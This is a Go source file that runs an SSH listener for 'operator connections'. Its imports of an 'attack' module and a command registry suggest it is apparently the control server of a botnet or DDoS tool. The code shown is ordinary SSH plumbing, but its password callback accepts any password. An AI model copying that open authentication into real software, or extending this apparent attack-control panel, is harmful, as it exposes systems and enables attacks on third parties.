package master

import (
	"fmt"
	"golang.org/x/crypto/ssh"
	"io/ioutil"
	"net"
	"server/core/config"
	"server/core/master/attack"
	"server/core/master/command/registry"
	"server/core/master/session/sshSession"
)

var sshConfig *ssh.ServerConfig

func Serve() {

	registry.Init()
	attack.Init()

	sshConfig = &ssh.ServerConfig{
		PasswordCallback: func(conn ssh.ConnMetadata, password []byte) (*ssh.Permissions, error) {
			return &ssh.Permissions{}, nil
		},
	}

	sshConfig.AddHostKey(parseKey("id_rsa"))

	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", config.Server.MasterPort))
	if err != nil {
		config.Logger.Fatal("Opening a listener failed", "error", err)
	}

	config.Logger.Info("Listening for operator connections", "port", config.Server.MasterPort)

	for {
		conn, err := listener.Accept()
		if err != nil {
			config.Logger.Error("Accepting the net connection failed", "error", err)
			return
		}

		go func() {
			sshConn, channel, _, err := ssh.NewServerConn(conn, sshConfig)
			if err != nil {
				return
			}

			for newChannel := range channel {
				go handleChannel(newChannel, *sshConn, conn)
			}
		}()
	}

}

func handleChannel(newChannel ssh.NewChannel, conn ssh.ServerConn, netConn net.Conn) {
	channel, _, err := newChannel.Accept()
	if err != nil {
		config.Logger.Error("Accepting the ssh channel failed", "error", err)
		return
	}

	Handle(&Master{
		SecureShellSession: &sshSession.SecureShellSession{
			Channel:    channel,
			Conn:       netConn,
			ServerConn: conn,
		},
		Channel: channel,
	})
}

func parseKey(name string) ssh.Signer {
	keyBytes, err := ioutil.ReadFile(name)
	if err != nil {
		config.Logger.Info("Reading the ssh key failed")
		return nil
	}
	parsedPrivateKey, err := ssh.ParsePrivateKey(keyBytes)
	if err != nil {
		config.Logger.Info("Parsing the ssh key failed")
		return nil
	}
	config.Logger.Info("Parsed the ssh key successfully", "file", name)
	return parsedPrivateKey
}
